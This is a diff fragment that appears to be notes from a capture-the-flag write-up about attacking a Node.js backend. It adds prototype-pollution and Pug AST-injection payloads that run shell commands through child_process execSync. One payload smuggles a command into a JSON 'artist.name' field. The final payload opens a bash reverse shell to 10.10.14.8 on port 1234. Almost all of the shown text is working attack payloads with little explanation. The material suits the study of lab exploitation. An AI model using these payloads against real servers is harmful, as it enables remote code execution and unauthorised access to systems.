@@ -25,5 +25,30 @@ Connection: close
 * There is no need to brute force directories I found an RCE exploit but it kept giving me command failed.
 * Anyway the backend is nodejs.
 
+```js
+Object.prototype.block = {"type": "Text", "line": "console.log(process.mainModule.require('child_process').execSync('id').toString())"};
+```
 
+```json
+"Haigh {'__proto__.block': {'type': 'Text','line': 'process.mainModule.require(\'child_process\').execSync(\'whoami\', function puts(error, stdout, stderr) {})'}}"
 
+{
+    "__proto__.block": {
+        "type": "Text", 
+        "line": "process.mainModule.require('child_process').execSync('whoami', function puts(error, stdout, stderr) {})"
+}}
+```
+
+```json
+{
+    "artist.name": "Haigh;console.log(process.mainModule.require('child_process').execSync('id').toString())"
+}
+```
+
+```
+//pug
+"__proto__.block": {
+        "type": "Text", 
+        "val": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/10.10.14.8/1234 0>&1'`)"
+    }
+```
